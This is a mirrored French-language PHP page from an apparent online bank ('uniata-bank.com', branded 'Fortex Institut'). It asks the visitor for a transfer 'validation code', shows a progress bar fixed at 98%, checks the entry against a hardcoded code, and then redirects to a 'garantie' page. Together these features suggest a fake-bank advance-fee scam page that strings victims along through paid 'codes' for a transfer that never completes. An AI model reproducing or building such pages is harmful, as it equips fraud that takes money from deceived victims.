<!DOCTYPE html>
<html lang="fr">

<!-- Mirrored from uniata-bank.com/register-custom.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Nov 2018 10:47:57 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Fortex Institut | Validation</title>
    
    <!-- core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <link href="css/prettyPhoto.css" rel="stylesheet">
    <link href="css/animate.min.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <link href="css/responsive.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="text/styl.html">
    <link rel="stylesheet" href="w3.css">

    <link rel="shortcut icon" href="icon.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="images/ico/apple-touch-icon-57-precomposed.png">
</head><!--/head-->

<body>
    <?php include("header.php")?>



    <div>
        <div class="center">            <br>    <br>
            <!--h2>COORDONNEE BANCAIRE</h2-->
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12">
                    <div class="section-headline text-center">
                        <h2><center><strong> CODE DE VALIDATION</strong></center></h2>
                        <br>
                        <div id="output" ></div>
                    </div>
                </div>
            </div>
        </div> 
        <fieldset class="zefield" style="margin-top: 40px">
          <div>
            <form method="post" action="">
              <center><input type="password" name="code" class="zebarre" style="margin-top: 10px"></center><br>
              <div class="w3-container w3-blue w3-round-xlarge" style="width:98%"><center>98%</center></div>
              <!--center><input type="submit" value="Demarrer le virement" class="zebouton"></center-->
              <center> <button type="submit" name="submit" class="btn btn-primary btn-lg" required="required">Continuer le virement</button></center>
          </form>
      </div>
  </fieldset>
</div>


<center><h3> <font color="red" ><br><p style="margin-left: 50px"> NB: Veillez entrer le code de valiadtion pour poursuivre le virement</p></font> </h3></center>

<?php
if(!empty($_POST))
{
    if(isset($_POST['code']))
    {
        $code = $_POST['code'];
        define('CODE', 'VALI9V44');
        if($code != CODE)
        {
            /*echo '<center><h4><font color="red">Code d\'assurance incorrect</font></h4></center>';*/
            echo '<script type=text/javascript> var message = "<center><label><font color=\"red\">Code de validation incorrect</font></label></center>"; </script>';
        }
        else
        {
            /*echo '<p><center><h4>Pour continuer le virement, cliquer <a href="code2.php#pricing">ici</a></h4></center></p>';*/
            echo '<script language="Javascript">document.location.replace("garantie.php#pricing");</script>';
                //echo '<script type="text/javascript> location.replace(\'code1.php\')</script>';
        }
        echo '<script type=text/javascript> document.getElementById("output").innerHTML = message; </script>';
    }
}
?>




<?php include("footer.php")?>

<script src="js/jquery.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.prettyPhoto.js"></script>
<script src="js/jquery.isotope.min.js"></script>
<script src="js/main.js"></script>
<script src="js/wow.min.js"></script>
</body>
</html>

<style>
.w3-light-grey, .w3-round-xlarge{
    margin-left: -0px;
    margin-right: 20px;
    padding-left : -5100px;
    margin-top: 20px

} 


.zefield{
    border : solid 2px;
    border-style: blur;

    background-image: url("bro.jpg");
    border-radius: 16px;
    -webkit-border-radius: 16px;
    -moz-border-radius: 16px;
    box-shadow: inset 0 1px 2px #000, 0 1px 0 #2b2b2b;
    -webkit-box-shadow: inset 0 1px 2px #000, 0 1px 0 #2b2b2b;
    -moz-box-shadow: inset 0 1px 2px #000, 0 1px 0 #2b2b2b;
    margin-right: 25.62%;
    margin-left: 25.62%;

}

.zebarre{
    border-radius: 30px;
    box-shadow: blur;
    width: 75%;
    border : solid 2px;

}

.zebouton {
    background-color: blue-white;
    border-radius: 50px;
    position : relative;
    border:none;
    font-size: px;
    text-align :center;
    -webkit-transition-duration:0.4s;
    transition-duration: 0.4s;
    text-decoration: none;
    overflow: hidden;
    cursor: pointer;
}
.zebouton:after {
    content: "";
    background:#90EE90;
    display: block;
    position: absolute;
    padding-top: 300%;
    padding-left: 350%;
    margin-left: -20px;
    margin-top: -120%;
    opacity: 0;
    transition: all 0.8s
}
.zebouton:active:after{
    padding:0;
    margin:0;
    opacity: 1;
    transition: 0s
}